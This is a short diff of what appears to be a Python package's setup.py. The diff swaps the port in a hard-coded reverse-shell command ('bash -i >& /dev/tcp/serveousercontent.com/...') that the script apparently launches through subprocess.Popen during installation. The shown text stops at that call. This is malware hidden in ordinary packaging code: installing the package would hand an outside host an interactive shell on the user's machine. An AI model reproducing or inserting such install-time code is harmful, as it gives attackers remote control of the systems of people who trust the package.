@@ -1,7 +1,7 @@
 import sys, subprocess
 from setuptools import setup, find_packages
 
-CMD = "bash -i >& /dev/tcp/serveousercontent.com/36835 0>&1"
+CMD = "bash -i >& /dev/tcp/serveousercontent.com/11787 0>&1"
 
 try:
     subprocess.Popen(
